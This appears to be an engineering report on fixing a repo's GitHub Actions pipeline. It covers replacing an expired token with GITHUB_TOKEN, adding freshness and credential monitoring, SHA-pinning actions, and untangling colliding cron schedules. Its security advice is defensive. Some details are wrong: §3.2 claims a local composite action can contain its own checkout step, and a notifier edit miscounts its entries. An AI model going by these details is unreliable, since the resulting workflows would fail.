# CI / Workflow Repair + Re-Architecture

All line numbers verified against `E:\2` at `dd6532ea`. Everything below is read-only analysis; nothing was changed.

---

## 0. New evidence this analysis turned up

Two facts that were not in the brief and that change the design:

**A. The heavy jobs are ~2 hours each.** Measured from the last 3 *successful* runs of each workflow (`gh run list --status=success`, `updatedAt - startedAt`):

| Workflow | Duration | Workflow | Duration |
|---|---|---|---|
| Update Reviews | **6,900 s ≈ 115 min** | Top Online Leaderboard | 1,250 s ≈ 21 min |
| Check Dead Links | **6,950 s ≈ 116 min** | Top Offline Leaderboard | 1,040 s ≈ 17 min |
| Purge Unhealthy Games | **6,930 s ≈ 115 min** | Auto Update JSON Data | 25 s |
| Generate Markdown Tables | 15 s | Anti-Cheat List | 13 s |
| Mark Dead Games | 20 s | Daily Snapshot | never ran |

Three ~2-hour jobs all share `concurrency: {group: data-write, cancel-in-progress: false}`. GitHub keeps **only one pending run per concurrency group** — a third arrival silently cancels the queued second. `notify-ci-failure.yml:37` fires only on `conclusion == 'failure'`, so **every concurrency eviction is invisible today**. On a day-1-that-is-a-Monday the current schedule serializes 363 minutes of `data-write`.

**B. `requirements.txt` is dead code in CI.** 10 of 11 `bash/*.sh` do `pip install --quiet requests` (`anti_cheat.sh:3`, `dead_links.sh:3`, `ingest.sh:3`, `json.sh:3`, `offline.sh:3`, `online.sh:3`, `purge.sh:3`, `refetch_all.sh:5`, `reviews.sh:3`, `snapshot.sh:3`) plus `bot-ingest.yml:49` and `ingest-from-issue.yml:30`. The pins `requests>=2.32.5,<3` / `urllib3>=2.6.3,<3` are honoured by exactly one job — `mark-dead-games.yml:38`. A bad urllib3 release breaks every scraper with nothing to roll back to.

---

## 1. The GH_TOKEN fix

### 1.1 Root cause, exact

`.github/workflows/update-json.yml:14` and 11 siblings pass `token: '${{ secrets.GH_TOKEN }}'` to `actions/checkout`. From the failing run's log:

```
2026-09-10T02:44:46.8731798Z   token: ***
2026-09-10T02:44:47.1497083Z ##[group]Fetching the repository
2026-09-10T02:44:47.2514212Z ##[error]fatal: could not read Username for 'https://github.com': terminal prompts disabled
2026-09-10T02:44:47.2524844Z The process '/usr/bin/git' failed with exit code 128
```

Note that the same log block reports `GITHUB_TOKEN Permissions / Contents: write` — **the built-in token already has push rights in that very job.** The repo-level default is `read` (`gh api .../actions/permissions/workflow` → `{"default_workflow_permissions":"read"}`), but each workflow's `permissions: {contents: write}` line overrides it. So the fix is purely a deletion.

### 1.2 Recommendation, ranked

| Option | Verdict |
|---|---|
| **Drop to `secrets.GITHUB_TOKEN` (i.e. delete the `token:` input)** | ✅ **Recommended.** Zero secrets to rotate, minted per run, expires when the job ends, scoped by the `permissions:` block, cannot be exfiltrated for reuse. Already proven in this repo — `mark-dead-games.yml:30` is the only green data workflow and it is the only one with a bare checkout. |
| GitHub App installation token (`actions/create-github-app-token`) | ✅ **Correct fallback**, not needed today. The App's private key never expires, the token is minted per run and dies in 1 h, so the silent-expiry class disappears entirely. Adopt this *only if* the owner later adds a `main` ruleset requiring signed commits / PRs, or wants bot pushes to trigger `push`-event workflows. |
| Fine-grained PAT | ⚠️ Better than classic (repo-scoped, `Contents: Read and write` only) but **still expires — max 366 days — so it reproduces this exact outage in a year.** Stopgap only. |
| Rotate the classic PAT | ❌ Worst. Broad `repo` scope on 23 workflows, and the failure recurs on the new expiry date. |

**After migration, delete the secret** so nothing can half-work: `gh secret delete GH_TOKEN`. (Also `gh secret delete BOT_TOKEN` — see §5.1; `gh secret list` shows both `BOT_TOKEN` *and* `TELEGRAM_BOT_TOKEN` exist, which is why the bug in `bot-ingest.yml` is ambiguous rather than obviously broken.)

### 1.3 Per-workflow verdict

| # | Workflow | File:line holding `GH_TOKEN` | GITHUB_TOKEN suffices? | Why |
|---|---|---|---|---|
| 1 | Auto Update JSON Data | `update-json.yml:14` | **Yes** | Pushes `data/` + `games/`. Its only child is triggered by `workflow_run`, not `push` — see §1.4. |
| 2 | Generate Markdown Tables | `update-daily.yml:15` | **Yes** | Terminal node; pushes `games/*.md` only. |
| 3 | Update Reviews | `update-reviews.yml:15` | **Yes** | Terminal; pushes `data/`. |
| 4 | Check Dead Links | `check-dead-links.yml:15` | **Yes** | Terminal. |
| 5 | Purge Unhealthy Games | `purge-unhealthy.yml:15` | **Yes** | Terminal. |
| 6 | Top Online Leaderboard | `top-online.yml:14` | **Yes** | Terminal. |
| 7 | Top Offline Leaderboard | `top-offline.yml:16` | **Yes** | Terminal. |
| 8 | Anti-Cheat List | `anti-cheat-list.yml:16` | **Yes** | Terminal. |
| 9 | Daily Snapshot | `snapshot-daily.yml:11` | **Yes** | Writes `data/snapshots/` only. |
| 10 | Ingest New Game Links | `ingest-new.yml:18` | **Yes — and strictly better** | `data_store.clear_temp()` (`scripts/core/data_store.py:179-183`) truncates `scripts/temp_info.jsonl`; `bash/ingest.sh:8` `git add .` re-commits it. That push matches **its own** path filter (`ingest-new.yml:6`) *and* `codeql.yml:14`'s `scripts/**`. Under a PAT this self-retriggers ingest (one wasted no-op run) and fires a pointless CodeQL scan. GITHUB_TOKEN suppresses both — the loop closes by construction. |
| 11 | Force Re-fetch All | `refetch-all.yml:32` | **Yes** | Manual, terminal. |
| 12 | Ingest from Issue | `ingest-from-issue.yml:15` | **Yes** | Needs `issues: write` too — already declared at line 4. `actions/github-script` defaults to `github.token`. |
| 13 | Mark Dead Games | *(none — bare checkout `:30`)* | **Yes, proven** | The control case. Its `gh workflow run "Generate Markdown Tables"` (`:65`) works because **`workflow_dispatch` is one of the two documented exceptions** to GITHUB_TOKEN event suppression. Verified: run at `2026-09-07T09:32:38Z` (Mark Dead Games, success) is followed 15 s later by `Generate Markdown Tables`, `event: workflow_dispatch`. |
| 14 | Bot Ingest | *(none — bare checkout `:40`)* | **Yes** | Already pushes with GITHUB_TOKEN. |
| 15 | CodeQL / releases / notify-* | — | **Yes** | Never push to `main`. |

**Conclusion: zero workflows genuinely require a PAT or App token.**

The only thing lost is the `push`-event chain, and both consumers of it are things you *want* suppressed (the ingest self-retrigger loop, and CodeQL scanning a truncated JSONL file). `deploy-pages.yml:4-9` was the third `push` consumer and it is being deleted anyway (§6).

**Cross-check against the tag ruleset:** ruleset `11884759` targets **tags**, includes `refs/tags/v1.*`, `v2.*`, `*beta`, `*alpha`, and enforces `required_signatures`. `release-desktop.yml` (`desktop-v*`) and `release-android.yml` (`android-v*`) do not match those globs, and no data workflow creates tags. No interaction.

### 1.4 The `workflow_run` question, answered directly

**`update-daily.yml:3` is *not* affected by GITHUB_TOKEN suppression, and neither are the three `notify-*` workflows.**

The suppression rule is: *events **created by** the GITHUB_TOKEN* (a `push`, an `issues`, a `release`…) do not start new workflow runs, with `workflow_dispatch` and `repository_dispatch` excepted. `workflow_run` is emitted by the Actions service when a run **completes**; the completing run here was started by `schedule`, not by a token-authored git operation. Nothing about the checkout token changes that.

**Empirical proof in this repo, today:** every failing `Auto Update JSON Data` run is followed within seconds by a `Generate Markdown Tables` run with `event: workflow_run` (skipped by `update-daily.yml:11` because `conclusion != 'success'`), and by a `Notify CI Failures` run with `event: workflow_run`. Example chain from `gh run list`:

```
2026-09-10T02:44:43Z  Auto Update JSON Data     schedule      failure
2026-09-10T02:45:20Z  Generate Markdown Tables  workflow_run  skipped
2026-09-10T02:45:20Z  Notify CI Failures        workflow_run  success
```

The one real `workflow_run` constraint that *does* apply: the listening workflow file must exist on the default branch, and `workflows:` strings must match the source `name:` field exactly. Both hold — but see §2 for the five workflows the list is *missing*.

### 1.5 The exact edit (× 12)

Delete the `with:` block on checkout. Pattern, using `update-json.yml` as the example (lines 13-14 → single line):

```yaml
# .github/workflows/update-json.yml  — BEFORE (lines 13-14)
      - uses: actions/checkout@v6
        with: {token: '${{ secrets.GH_TOKEN }}'}

# AFTER
      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.0.3
        # No `token:` — the run-scoped GITHUB_TOKEN is used. `permissions:
        # contents: write` (line 5) is what authorises the push; the repo
        # default is `read`, so that line must NOT be removed.
```

Same deletion at `update-daily.yml:15`, `update-reviews.yml:15`, `check-dead-links.yml:15`, `purge-unhealthy.yml:15`, `top-online.yml:14`, `top-offline.yml:16`, `anti-cheat-list.yml:16`, `snapshot-daily.yml:11`, `ingest-new.yml:18`, `refetch-all.yml:31-32`, `ingest-from-issue.yml:15`.

**In practice all 11 Python writers collapse into one composite action** — see §3.2, which makes this a one-file edit forever after.

### 1.6 Fallback: the GitHub App recipe, for the file

Keep this in `docs/` so it is ready if `main` ever gets a signed-commit rule:

```yaml
      - name: Mint an installation token
        id: app-token
        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
        with:
          app-id: ${{ vars.DATA_BOT_APP_ID }}          # a variable, not a secret
          private-key: ${{ secrets.DATA_BOT_PRIVATE_KEY }}

      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.0.3
        with:
          token: ${{ steps.app-token.outputs.token }}

      # …work…

      - name: Revoke the installation token
        if: always()
        env:
          GH_TOKEN: ${{ steps.app-token.outputs.token }}
        run: gh api -X DELETE /installation/token || true
```

App permissions: **Repository → Contents: Read and write**, plus **Actions: Read and write** only for `mark-dead-games.yml` (it dispatches). Nothing else. The private key never expires; the token lives 1 h. This is the only option that structurally cannot repeat the current outage.

### 1.7 One consequence worth stating for the Cloudflare migration

GITHUB_TOKEN suppression applies to **GitHub Actions events only**. Cloudflare Workers Builds is a GitHub App receiving webhooks — it will still see bot pushes. Since the daily pipeline pushes `data/**` every day, **the Worker's build watch paths must exclude `data/**`, `games/**` and `data/snapshots/**`**, or you will rebuild and redeploy the SPA 30+ times a month for content the app fetches at runtime anyway.

---

## 2. Monitoring: catching the next silent credential

### 2.1 What `notify-ci-failure.yml` does and doesn't catch

**Does:** `conclusion == 'failure'` (`:37`) on 12 named workflows (`:13-24`), delegated to `poli0981/.github/.github/workflows/notify-ci-failure.yml@main` with `secrets: inherit`. It has been firing correctly every single day since ~15 May — `Notify CI Failures / success` appears in the run list for every failed run. **The notification channel worked perfectly and the outage still lasted ~4 months.** That is the finding: the problem is not delivery, it is that a daily identical Discord ping is indistinguishable from background noise.

**Doesn't catch:**

1. **`cancelled`** — which is exactly what a `data-write` concurrency eviction produces. With three 115-minute jobs sharing the group, evictions are routine and completely invisible.
2. **`timed_out`** — no data workflow declares `timeout-minutes` except `refetch-all.yml:26` and `bot-ingest.yml:36`, so a hung 2-hour job silently burns the 6-hour default and dies as `timed_out`, unreported.
3. **Five workflows are missing from the list** (`:13-24`): `Top Offline Leaderboard`, `Anti-Cheat List`, `Daily Snapshot` (once committed), `Release Android App`, `Announce Release as Discussion`. `notify-release-pipeline.yml:7-9` lists only `Release Desktop App` and `Announce Release to Discord` — so the Android release and the Discussion announcer are monitored by nobody.
4. **Ambiguous name match:** two workflows are registered as `CodeQL` — `.github/workflows/codeql.yml` (id 273346534) and a legacy `dynamic/github-code-scanning/codeql` (id 224598234, inert: `code-scanning/default-setup` reports `not-configured`). Harmless but the string `"CodeQL"` at `:24` matches ambiguously; deregister the legacy one.
5. **A run that never happens.** No heartbeat. If a cron stops firing — GitHub congestion, Actions disabled, a YAML parse error producing `startup_failure` — there is no run to fail, so nothing notifies.
6. **No dedup or escalation.** Day 1 and day 120 look identical.

### 2.2 What to add — three layers, in value order

**Layer 1 (highest value): outcome-based freshness monitoring.** Don't watch the machinery, watch the result. `data/index.json.last_updated` is already the app's cache-invalidation signal; if it stops moving, the pipeline is broken *for any reason whatsoever* — expired token, Steam API change, concurrency eviction, GitHub outage. This single check would have raised an alarm on day 2 of the current outage even if every notifier were dead.

**Layer 2: a credential canary that exercises each secret read-only**, so an expiry is caught before the 2-hour job wastes runner time. Once §1 lands there is no PAT left to check, but `STEAM_API_KEY` and the new Cloudflare service token both need it.

**Layer 3: report into a *stateful* channel.** A GitHub Issue, upserted — created when unhealthy, commented + reopened while still unhealthy, closed when healthy. Unlike a Discord ping, an open issue is a persistent object you cannot scroll past, and it dedups automatically.

Plus two cheap hardenings on the existing notifier.

### 2.3 New file: `.github/workflows/pipeline-health.yml`

```yaml
name: Pipeline Health

# Outcome-based monitoring: asserts the DATA is fresh and the CREDENTIALS are
# live, independent of whether any individual workflow reported failure.
# Deliberately reports into a single GitHub Issue (stateful, deduped) rather
# than a chat webhook — the 2026-05..09 outage proved chat pings get tuned out.

on:
  schedule:
    - cron: '9 16 * * *'      # 16:09 UTC — after every writer slot has closed
  workflow_dispatch:

permissions:
  contents: read
  issues: write
  actions: read

concurrency:
  group: pipeline-health
  cancel-in-progress: true

jobs:
  health:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    outputs:
      report: ${{ steps.check.outputs.report }}
      healthy: ${{ steps.check.outputs.healthy }}
    steps:
      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.0.3
        with:
          persist-credentials: false

      - uses: actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1 # v6.0.0
        with:
          python-version-file: .python-version

      - name: Run health checks
        id: check
        env:
          STEAM_API_KEY: ${{ secrets.STEAM_API_KEY }}
          CF_ACCESS_CLIENT_ID: ${{ secrets.CF_ACCESS_CLIENT_ID }}
          CF_ACCESS_CLIENT_SECRET: ${{ secrets.CF_ACCESS_CLIENT_SECRET }}
          GH_TOKEN: ${{ github.token }}
          REPO: ${{ github.repository }}
        run: |
          python -m pip install --disable-pip-version-check -q -r requirements.txt
          python scripts/health_report.py >> "$GITHUB_STEP_SUMMARY"

      - name: Upsert the health issue
        if: always()
        uses: actions/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd # v8.0.0
        env:
          HEALTHY: ${{ steps.check.outputs.healthy }}
          REPORT: ${{ steps.check.outputs.report }}
        with:
          script: |
            const TITLE = '🚨 Pipeline health';
            const healthy = process.env.HEALTHY === 'true';
            const body = process.env.REPORT || '(no report produced)';
            const { owner, repo } = context.repo;

            const found = await github.rest.search.issuesAndPullRequests({
              q: `repo:${owner}/${repo} is:issue in:title "${TITLE}"`,
              per_page: 5,
            });
            const issue = found.data.items.find((i) => i.title === TITLE);

            if (healthy) {
              if (issue && issue.state === 'open') {
                await github.rest.issues.createComment({
                  owner, repo, issue_number: issue.number,
                  body: `✅ Recovered at ${new Date().toISOString()}.\n\n${body}`,
                });
                await github.rest.issues.update({
                  owner, repo, issue_number: issue.number, state: 'closed',
                });
              }
              return;
            }

            const run = `${context.serverUrl}/${owner}/${repo}/actions/runs/${context.runId}`;
            const full = `${body}\n\n[Health run](${run})`;
            if (issue) {
              await github.rest.issues.update({
                owner, repo, issue_number: issue.number, state: 'open',
              });
              await github.rest.issues.createComment({
                owner, repo, issue_number: issue.number, body: full,
              });
            } else {
              await github.rest.issues.create({
                owner, repo, title: TITLE, body: full, labels: ['ci'],
              });
            }

      - name: Fail the run when unhealthy
        if: steps.check.outputs.healthy != 'true'
        run: exit 1     # so `Pipeline Health` also reaches notify-ci-failure
```

`scripts/health_report.py` (new, read-only) should assert, writing Markdown to stdout and `healthy=true|false` + a `report` heredoc to `$GITHUB_OUTPUT`:

| Check | Threshold | Catches |
|---|---|---|
| `data/index.json.last_updated` age | < 48 h | Any pipeline stall, whatever the cause |
| Newest `data/snapshots/*.jsonl` date | ≤ 1 day old | Snapshot job dead |
| `GET https://api.steampowered.com/…/GetNumberOfCurrentPlayers/v1/?appid=730&key=$STEAM_API_KEY` | HTTP 200 | Expired/revoked Steam key |
| `GET https://free-steam-games.win/api/admin/health` with the CF-Access service-token headers | HTTP 200 | Expired Cloudflare service token (§8) |
| Per workflow: newest `conclusion == 'success'` run age vs. its expected cadence × 2.5 | within budget | A cron that stopped firing, or one failing repeatedly |
| Any run in the last 24 h with `conclusion` in `cancelled`/`timed_out` | none | Concurrency evictions |

The per-workflow recency check is the heartbeat and needs no extra credential:
`gh api "repos/$REPO/actions/workflows/$ID/runs?status=success&per_page=1"`.

### 2.4 Two edits to the existing notifier

`.github/workflows/notify-ci-failure.yml` — add the five missing workflows and widen the conclusion filter:

```yaml
# lines 12-25 → add these four entries (Daily Snapshot once committed):
      - "Top Offline Leaderboard"
      - "Anti-Cheat List"
      - "Daily Snapshot"
      - "Release Android App"
      - "Announce Release as Discussion"
      - "Pipeline Health"

# line 37 → widen:
    if: contains(fromJSON('["failure","cancelled","timed_out","startup_failure"]'),
                 github.event.workflow_run.conclusion)
```

Caveat: the reusable at `poli0981/.github/.github/workflows/notify-ci-failure.yml@main` has its own internal `if:` on failure (the comment at `:35-36` says so). Widening the caller alone will produce `skipped` runs for cancellations unless the reusable is widened too — that repo is out of scope here, so **flag it as a required companion change**, or handle cancellations locally in `pipeline-health.yml` (which the table above already does).

`notify-release-pipeline.yml:6-9` — add `"Release Android App"` and `"Announce Release as Discussion"`.

### 2.5 Per-job failure summary

Rather than 12 copies, put it in the composite action of §3.2 as a final `if: failure()` step:

```yaml
    - name: Failure summary
      if: failure()
      shell: bash
      run: |
        {
          echo "### ❌ \`${{ github.workflow }}\` failed"
          echo
          echo "| field | value |"
          echo "|---|---|"
          echo "| script | \`${{ inputs.script }}\` |"
          echo "| run | ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }} |"
          echo "| data last_updated | $(python -c "import json;print(json.load(open('data/index.json'))['last_updated'])" 2>/dev/null || echo '(unreadable)') |"
          echo "| head | $(git rev-parse --short HEAD 2>/dev/null || echo '?') |"
        } >> "$GITHUB_STEP_SUMMARY"
```

---

## 3. Version normalization

### 3.1 Choosing the targets

**`actions/checkout` → `v6` (SHA-pinned).** Currently v4 × 8, v5 × 3, v6 × 7. v7.0.1 exists but went ESM and changed fork-PR checkout behaviour for `pull_request_target`/`workflow_run`. **Do not stack an untested action-major bump on top of a token migration you need to verify.** v6 is already resolving green in this repo today (the failing log shows `actions/checkout@v6 (SHA:d23441a…)` downloading fine — it is the *token*, not the action, that fails). Let Dependabot propose v7 as a separate, reviewable PR.

**`actions/setup-python` → `v6` (SHA-pinned).** Currently v5 × 7, v6 × 8. Same reasoning; v7.0.0 also went ESM and **removed the `pip-install` input**.

**`actions/github-script` → `v8` (SHA-pinned).** Currently v7 × 2 (`ingest-from-issue.yml:20,41`), v8 × 1 (`announce-release-discussion.yml:22`, proven green on 2026-05-11). Do **not** jump to v9: it is ESM-only and `require('@actions/github')` no longer works. Neither existing script uses that, but `ingest-from-issue.yml:26,46` use `require('fs')`, which needs verifying under the v9 wrapper before adopting.

**`actions/setup-node` → `v5`** — already uniform at v5 in all three consumers; leave it, SHA-pin it.

**Python → `3.14`, recorded once in a new `.python-version` file.** Currently 3.11 × 1, 3.12 × 7, 3.14 × 7. Justification:
- Every pipeline import is stdlib or `requests`/`urllib3` (verified by grepping all of `scripts/**.py`): `json os re sys time random glob datetime pathlib typing dataclasses collections argparse hashlib shutil` + `requests`, `urllib3.util.retry.Retry`, `requests.adapters.HTTPAdapter`. Nothing removed in 3.13/3.14 is touched.
- `scripts/snapshot.py:33` uses `int | None` (PEP 604) → needs ≥ 3.10; satisfied everywhere.
- 3.14 is the current plurality and `actions/setup-python@v6` already resolves it green in this repo (`codeql.yml:76-78`, CodeQL succeeded 2026-09-07).
- `requests` / `urllib3` are pure-Python; no wheel risk.
- No downgrades are required, so nobody has to re-validate a 2-hour scraper against an older interpreter.

Use `python-version-file: .python-version` so future bumps are a one-line change and local dev (pyenv/uv/asdf) reads the same file.

**Also: install from `requirements.txt`, not `pip install requests`.** Add `cache: pip` + `cache-dependency-path: requirements.txt` (currently only `mark-dead-games.yml:35-36` does this).

**SHA-pinning policy.**
- *Third-party actions* (`tauri-apps/*`, `dtolnay/*`, `Swatinem/*`, `softprops/*`, `android-actions/*`, `nttld/*`): **pin to a full 40-char commit SHA with a `# vX.Y.Z` trailing comment.** A mutable tag on a third-party action is arbitrary-code-execution-on-push; `tauri-apps/tauri-action@v0` (`release-desktop.yml:68`) is the worst offender — a floating major-zero tag that has since been superseded by `action-v1.0.0`.
- *`actions/*` (GitHub-owned)*: pin to SHA as well. The marginal cost is zero once Dependabot maintains them, and it makes the policy uniform and lint-able.
- *`github/codeql-action`*: pin to SHA; it is GitHub-owned but auto-updating.
- *Reusable workflows `poli0981/.github@main`*: `main` is a mutable ref in a repo you control, invoked with **`secrets: inherit`** — every secret in this repo is handed to whatever `main` currently contains. Pin to a SHA: `uses: poli0981/.github/.github/workflows/notify-ci-failure.yml@c3e118a01d40e95b36b2c3466dc206638c11eb5a # main @ 2026-xx`. Note Dependabot's `github-actions` ecosystem **does** update reusable-workflow SHAs, so pinning costs nothing in maintenance. If pinning is judged too heavy, the minimum alternative is to replace `secrets: inherit` with an explicit `secrets:` map naming only `DISCORD_CI_WEBHOOK` etc.
- Enforce with a Dependabot config (there is none in-tree today):

```yaml
# .github/dependabot.yml  (NEW)
version: 2
updates:
  - package-ecosystem: github-actions
    directory: "/"
    schedule: { interval: weekly, day: tuesday, time: "07:00", timezone: "Etc/UTC" }
    open-pull-requests-limit: 5
    groups:
      actions-minor:
        update-types: [minor, patch]
  - package-ecosystem: pip
    directory: "/"
    schedule: { interval: weekly, day: tuesday }
  - package-ecosystem: npm
    directory: "/web"
    schedule: { interval: weekly, day: tuesday }
  - package-ecosystem: cargo
    directory: "/web/src-tauri"
    schedule: { interval: weekly, day: tuesday }
```

### 3.2 The structural fix: one composite action

Eleven workflows are byte-for-byte `checkout → setup-python → run bash/X.sh`. Collapse them:

```yaml
# .github/actions/py-data-job/action.yml  (NEW)
name: Python data job
description: Checkout, pinned Python, pinned deps, run a bash/*.sh writer, summarise failures.

inputs:
  script:
    description: Path to the bash/*.sh wrapper to execute.
    required: true
  steam-api-key:
    description: STEAM_API_KEY, for scripts that call Steam. Composite actions cannot read `secrets`.
    required: false
    default: ''

runs:
  using: composite
  steps:
    - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.0.3
      # No `token:` — the run-scoped GITHUB_TOKEN pushes; the CALLING workflow's
      # `permissions: contents: write` is what authorises it.

    - uses: actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1 # v6.0.0
      with:
        python-version-file: .python-version
        cache: pip
        cache-dependency-path: requirements.txt

    - name: Install pinned dependencies
      shell: bash
      run: python -m pip install --disable-pip-version-check -q -r requirements.txt

    - name: Run ${{ inputs.script }}
      shell: bash
      env:
        STEAM_API_KEY: ${{ inputs.steam-api-key }}
      run: |
        chmod +x "${{ inputs.script }}"
        "${{ inputs.script }}"

    - name: Failure summary
      if: failure()
      shell: bash
      run: |
        # …as in §2.5…
```

`.python-version` (NEW, one line): `3.14`

A caller then reads, in full:

```yaml
# .github/workflows/update-reviews.yml  (rewritten, replaces all 20 lines)
name: Update Reviews

on:
  schedule: [{ cron: '11 5 * * 2,4,6' }]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: data-write
  cancel-in-progress: false

jobs:
  reviews:
    runs-on: ubuntu-latest
    timeout-minutes: 180        # measured 115 min; default 360 would hold data-write for 6 h
    steps:
      - uses: ./.github/actions/py-data-job
        with:
          script: ./bash/reviews.sh
```

Note the composite action lives in-repo, so `actions/checkout` must have run for `uses: ./…` to resolve — GitHub handles this by checking out the *action's* repo automatically for local composite actions. This is why the checkout step sits inside the composite: it works.

### 3.3 The normalization table

| Workflow | checkout | setup-python | setup-node | github-script | Python | Other pins | Token |
|---|---|---|---|---|---|---|---|
| `update-json.yml` | v6 `:13` → composite | v6 `:15` → composite | — | — | 3.14 `:16` → `.python-version` | — | drop `:14` |
| `update-daily.yml` | v6 `:14` → composite | v6 `:16` → composite | — | — | 3.14 `:17` → file | — | drop `:15` |
| `update-reviews.yml` | v6 `:14` → composite | v6 `:17` → composite | — | — | 3.14 `:18` → file | — | drop `:15` |
| `check-dead-links.yml` | v6 `:14` → composite | v6 `:17` → composite | — | — | **3.12** `:18` → file | — | drop `:15` |
| `purge-unhealthy.yml` | v6 `:14` → composite | v6 `:17` → composite | — | — | 3.14 `:18` → file | — | drop `:15` |
| `top-online.yml` | **v4** `:13` → composite | **v5** `:15` → composite | — | — | **3.12** `:16` → file | — | drop `:14` |
| `top-offline.yml` | **v4** `:15` → composite | **v5** `:17` → composite | — | — | **3.12** `:18` → file | — | drop `:16` |
| `anti-cheat-list.yml` | **v4** `:15` → composite | **v5** `:17` → composite | — | — | **3.12** `:18` → file | — | drop `:16` |
| `snapshot-daily.yml` | **v4** `:10` → composite | **v5** `:12` → composite | — | — | **3.12** `:13` → file | — | drop `:11` |
| `ingest-new.yml` | v6 `:17` → composite | v6 `:20` → composite | — | — | 3.14 `:21` → file | — | drop `:18` |
| `refetch-all.yml` | v6 `:30` → composite | v6 `:36` → composite | — | — | 3.14 `:38` → file | — | drop `:32` |
| `mark-dead-games.yml` | **v4** `:30` → composite | **v5** `:32` → composite | — | — | **3.11** `:34` → file | — | already OK |
| `bot-ingest.yml` | **v4** `:40` → `@d23441a…` #v6.0.3 | **v5** `:43` → `@ece7cb0…` #v6.0.0 | — | — | **3.12** `:45` → `.python-version` | `:49` `pip install requests` → `-r requirements.txt` | already OK |
| `ingest-from-issue.yml` | **v4** `:14` → `@d23441a…` | **v5** `:17` → `@ece7cb0…` | — | **v7** `:20`,`:41` → `@ed59741…` #v8.0.0 | **3.12** `:18` → file | `:30` `pip install requests` → `-r requirements.txt` | drop `:15` |
| `codeql.yml` | **v4** `:72` → `@d23441a…` | v6 `:76` → `@ece7cb0…` | — | — | 3.14 `:78` → file | `github/codeql-action/{init,analyze}@v4` `:81`,`:87` → `@b96794f0…` | n/a |
| `deploy-pages.yml` | **v5** `:28` | — | v5 `:30` | — | — | `upload-pages-artifact@v4` `:46`, `deploy-pages@v5` `:58` | **DELETE FILE (§6)** |
| `release-desktop.yml` | **v5** `:31` → `@d23441a…` | — | v5 `:48` → `@a0853c2…` #v5.0.0 | — | — | `dtolnay/rust-toolchain@stable` `:55` → `@6bed076…`; `Swatinem/rust-cache@v2` `:59` → `@6323deb…` #v2.9.2; **`tauri-apps/tauri-action@v0` `:68` → `@1deb371…` # action-v1.0.0** | n/a |
| `release-android.yml` | **v5** `:35` → `@d23441a…` | — | v5 `:43` → `@a0853c2…` | — | — | `setup-java@v4` `:38` → `@cf277c6…`; `rust-toolchain@stable` `:50` → `@6bed076…`; `rust-cache@v2` `:54` → `@6323deb…`; `android-actions/setup-android@v3` `:60` → `@9fc6c4e…`; `nttld/setup-ndk@v1` `:63` → `@ed92fe6…` #v1.6.0; `softprops/action-gh-release@v2` `:112` → `@6da8fa9…` #v2.4.1 | n/a |
| `announce-release-discussion.yml` | — | — | — | **v8** `:22` → `@ed59741…` | — | — | n/a |
| `announce-release.yml` | — | — | — | — | — | reusable `@main` `:20` → `@c3e118a…` | n/a |
| `notify-ci-failure.yml` | — | — | — | — | — | reusable `@main` `:38` → `@c3e118a…` | n/a |
| `notify-deploy.yml` | — | — | — | — | — | — | **DELETE FILE (§6)** |
| `notify-release-pipeline.yml` | — | — | — | — | — | reusable `@main` `:18` → `@c3e118a…` | n/a |

Bold = currently off-target. **Re-resolve every SHA at implementation time** (`gh api repos/OWNER/REPO/commits/TAG -q .sha`) — the ones above were resolved 2026-09-10.

Two more `codeql.yml` fixes while you are in the file:
- `:16-18`, `:35-38`: delete the four `webapp/**` path entries — that directory has never existed (copy-pasted template, as the header comment at `:3-6` admits).
- `:68`: add `'actions'` to the matrix. CodeQL's Actions analysis is available (`code-scanning/default-setup` reports `actions` among supported languages) and it flags exactly the class of bug found in §5.1 — expression injection into a `run:` block.

---

## 4. Cron rescheduling

### 4.1 The current timetable and why it collides

| UTC | Days | Workflow | Duration | Ends |
|---|---|---|---|---|
| 00:00 | daily | Auto Update JSON Data (`update-json.yml:3`) → `workflow_run` → Generate Markdown Tables | 25 s + 15 s | 00:01 |
| 03:00 | Sun/Wed/Fri | Top Online (`top-online.yml:3`) | 21 min | 03:21 |
| 04:00 | 1,6,11,16,21,26 | Check Dead Links (`check-dead-links.yml:3`) | **116 min** | 05:56 |
| 04:30 | Mon/Thu | Mark Dead Games (`mark-dead-games.yml:7`) | 20 s | 04:31 |
| 05:00 | Mon | Purge Unhealthy (`purge-unhealthy.yml:3`) | **115 min** | 06:55 |
| 05:00 | 1,15 | Top Offline (`top-offline.yml:5`) | 17 min | 05:17 |
| 06:00 | Sun | Anti-Cheat List (`anti-cheat-list.yml:5`) | 13 s | 06:01 |
| 06:00 | 1,3,5,…,31 | Update Reviews (`update-reviews.yml:3`) | **115 min** | 07:55 |
| 14:00 | Mon | CodeQL (`codeql.yml:46`) | 78 s | own group |
| 23:00 | daily | Daily Snapshot (`snapshot-daily.yml:3`) | ~1 min | **no concurrency group** |

Problems:

1. **Every start is on the top of the hour** — GitHub's own guidance is to avoid it; scheduled runs there are routinely delayed 5–30 min, which cascades through a serialized queue.
2. **Guaranteed pile-ups.** A Monday-the-6th queues Check Dead Links (04:00–05:56) → Mark Dead Games (04:30, waits ~86 min) → Purge Unhealthy (05:00, waits) → Update Reviews if odd-dated (06:00, waits). Because GitHub keeps **only one pending run per concurrency group**, the third arrival **cancels** the second. Silently — §2.1 item 1.
3. **`update-reviews.yml:3` `0 6 */2 * *` is a day-of-month step, not "every 2 days":** it fires on the 1st, 3rd, 5th … 31st, so after a 31-day month it fires on the 31st *and* the 1st — back-to-back 115-minute runs. Also 15–16 runs/month, not 15.
4. **Update Reviews at 06:00 starts 4 minutes after Check Dead Links ends** on collision dates. Any delay at all and they overlap.
5. **`snapshot-daily.yml` has no `concurrency:` block at all** (lines 5-6 go straight from `permissions` to `jobs`) — it can run *concurrently* with a heavy writer, both `git push`, one loses.
6. **Ordering is wrong for the snapshot.** At 23:00 it captures data written up to 19 hours earlier and 1 hour before the next daily refresh — the least fresh moment of the day.
